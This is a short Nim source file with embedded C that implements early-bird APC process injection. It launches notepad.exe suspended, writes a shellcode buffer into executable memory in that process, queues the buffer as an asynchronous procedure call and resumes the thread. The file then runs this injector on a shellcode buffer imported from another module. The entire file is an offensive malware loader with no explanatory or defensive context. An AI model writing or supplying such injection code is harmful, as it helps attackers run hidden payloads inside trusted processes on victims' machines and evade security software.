import public

{.emit: """
int Early(char *shellcode,SIZE_T shellcodeSize)
{
  STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
	HANDLE victimProcess = pi.hProcess;
	HANDLE threadHandle = pi.hThread;
	LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	//3.Execute shellcode
	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
	WriteProcessMemory(victimProcess, shellAddress, shellcode, shellcodeSize, NULL);
	QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
	ResumeThread(threadHandle);
	return 0;
}
""".}
proc Early(plainBuffer:cstring,size:cint):cint {.importcpp:"Early(@)",nodecl.}

discard Early(code,codelen)
